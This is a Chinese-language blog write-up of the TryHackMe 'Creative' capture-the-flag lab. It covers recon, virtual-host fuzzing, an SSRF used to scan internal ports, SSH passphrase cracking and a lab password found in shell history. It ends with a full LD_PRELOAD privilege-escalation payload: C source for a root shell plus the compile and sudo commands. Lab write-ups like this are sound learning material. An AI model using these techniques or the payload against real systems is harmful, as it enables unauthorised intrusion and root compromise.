---
layout: post
title:  "TryHackMe Challenge Writeup: Creative"
date:   1 July 2025
categories: Demo
tags: TryHackMe-Challenge Writeup
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
### Intro
本篇是關於TryHackMe上的Challenge: [Creative](https://tryhackme.com/room/creative) 我的解題思路和歷程，紀錄自己嘗試了哪些手段以及學習了哪些新的攻擊手法和切入角度



### Step 1. Nmap

```bash
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 1a:a5:be:be:61:96:d0:bd:d8:8a:54:f9:92:e0:5b:fb (RSA)
|   256 dd:f6:c3:ce:41:03:65:d8:1d:0e:3e:bb:58:9d:c3:7e (ECDSA)
|_  256 fc:bc:54:30:8d:67:35:23:6f:fc:2d:a0:78:cc:5a:85 (ED25519)
80/tcp open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://creative.thm
```

```bash
└─# nmap -p80 -sVC -O creative.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 04:38 EDT
Nmap scan report for creative.thm (10.10.253.240)
Host is up (0.48s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
```

- 檢查80




### Step 2. Web
- 發現幾位開發者名字可能有用，先記起來
- 用 whatweb 跑跑看:

```bash
└─# whatweb creative.thm
http://creative.thm [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@example.com,info@website.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.253.240], JQuery[3.4.1], Meta-Author[Devcrud], PasswordField, Script, Title[Creative Studio | Free Bootstrap 4.3.x template], YouTube, nginx[1.18.0]
```

- 發現網站作者名爲 **Devcrud**，記下來或許後面用得到
- 嘗試路徑枚舉，沒發現什麽感興趣的:

```bash
└─# gobuster dir -u creative.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html
```

- 嘗試 vhost 枚舉，因爲發現其實原本的FQDN是 creative.thm 可能還有底下的虛擬主機，發現一堆結果但是有一個返回的頁面跟別的不同: `beta.creative.thm`

```bash
└─# ffuf -u http://10.10.255.41 -H "Host: FUZZ.creative.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r -c
beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 502ms]
mobile                  [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 511ms]
admin                   [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 519ms]
mail2                   [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 516ms]
old                     [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 521ms]
new                     [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 522ms]
cp                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 524ms]
support                 [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 528ms]
cpanel                  [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 529ms]
shop                    [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 529ms]
...
```




### Step 3. Web(beta.creative.thm)
- 網站提供了一個 URL tester 的功能，直覺就是可能有SSRF的漏洞存在
- 手動試了一些最基礎的SSRF都發現行不通: `beta.example.com/../../../` 和 `beta.example.com/assets`
- 試試看 seclist 中 fuzzing 相關的字典檔:
    - seclists/Fuzzing/command-injection-commix.txt
    - seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt
    - seclists/Fuzzing/LFI/LFI-Jhaddix.txt
- 發現全部都是一致的回應，那麼再測測看Server底下有沒有開其他port的web: 建立一個字典檔從1～65536，並ffuf做模糊測試: `ffuf -X POST -u http://beta.creative.thm -w ports.txt -d "url=http://127.0.0.1:FUZZ/" -H "Content-Type: application/x-www-form-urlencoded" -fw 3`
- 發現除了80之外還有一個**port 1337**
- 瀏覽器打開後發現應該是從根目錄(/)的Web Server，首先肯定關注 /home 目錄，發現除了用戶 ubuntu 還有用戶 **saad**，最後可獲得ssh私鑰，但發現需要 passphrase
- 用 ssh2john 破解 ssh passphrase: **s.......s**
- 成功獲得 user flag




### Step 4. 提權
- 首先跑linpeas看看有什麼攻擊角度

```bash
╔══════════╣ Searching passwords in history files
sudo -l                                                                           
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
sudo -l
sudo -l
mysql -u root -p
mysql -u root
sudo su
ssh root@192.169.155.104
mysql -u user -p
mysql -u db_user -p
ls -ld /var/lib/mysql
```

- 發現有一個 creds.txt 文件並且它應該是藏在某個 saad 讀不到的文件夾內，但我們可以知道 saad 用戶密碼。況且我們可以知道 sudo -l 可能是攻擊角度

```bash
saad@ip-10-10-177-196:/tmp$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on ip-10-10-177-196:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-10-177-196:
    (root) /usr/bin/ping
```

- ping 有 sudo 權限，但通過 GTFOBins 查詢卻沒辦法利用。但同時我還發現在sudo -l的結果中有一個 `env_keep+=LD_PRELOAD` 很奇怪，通過查詢確實可以利用這個設置和 (root)/usr/bin/ping 提權，以下步驟出自[這篇文章](https://www.cnblogs.com/backlion/p/10503985.html)
    - 創建一個 shell.c:
    ```C
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/sh");
    }
    ```
    - 根據這個shell.c創建一個library:shell.so: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
    - 最後執行 `sudo LD_PRELOAD=/tmp/shell.so ping` 即可獲得 root shell



### 總結
自己卡關的步驟:
- 枚舉虛擬主機
- SSRF => 枚舉開放port
- 新的提權手法: `env_keep+=LD_PRELOAD`


## 學習資料
1. [TryHackMe Challenge: Creative](https://tryhackme.com/room/creative)
2. [Writeup \| Creative](https://0xb0b.gitbook.io/writeups/tryhackme/2024/creative)
3. [使用LD_Preload的Linux权限升级技巧](https://www.cnblogs.com/backlion/p/10503985.html)

</div>
</body>
</html>
